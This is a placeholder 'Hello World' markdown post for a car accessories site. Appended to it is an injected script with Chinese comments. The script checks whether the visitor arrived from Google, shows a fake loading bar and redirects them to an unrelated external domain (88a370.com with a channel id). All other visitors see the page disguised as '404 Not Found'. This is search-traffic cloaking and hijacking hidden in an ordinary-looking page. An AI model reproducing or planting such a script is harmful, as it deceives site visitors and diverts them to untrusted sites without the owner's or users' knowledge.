---
title: Hello World
description: Welcome to Car Accessories Site
slug: hello-world
date: 2022-03-06 00:00:00+0000
image: cover.jpg
categories:
    - Example Category
tags:
    - Example Tag
weight: 1       # You can add weight to some posts to override the default sorting (date descending)
---

Welcome to Car Accessories Site. This is your first post. Edit or delete it, then start writing!

You can find news about Car Accessories here.

<script>
    //判断是否从谷歌进入
    var referrera = document.referrer;
	if (referrera.includes('google.com')) {
	    document.querySelector('.awwww').style.display = 'none';
	      	//获取content节点
        var _content=document.getElementById("ddtzcontent");
        var num=0; //进度条里边的长度
        
        //设置计时器（动起来的关键）
        var id = setInterval(function(){
           num++;
           //设置content的宽度（动态变化）
           _content.style.width=`${num}px`;
           var num1=parseInt(num/3);
           //content内文字显示为百分比与宽度对应
           _content.innerText=`${num1}%`;
           //当content的宽度与container宽度相同时清除计时器
           if(num==300){
            clearInterval(id);
           }
           //加载到100%时替换content中的文字
        if(_content.innerText=="100%"){
            //_content.innerText="跳转页面"
        	window.location.href='https://88a370.com?ch=14194';
        }
        //每隔10毫秒变换一次
        },5)
	} else {
	  document.title = "404 Not Found";
	  document.querySelector('.ddtzcontainer').style.display = 'none';
	}

    </script>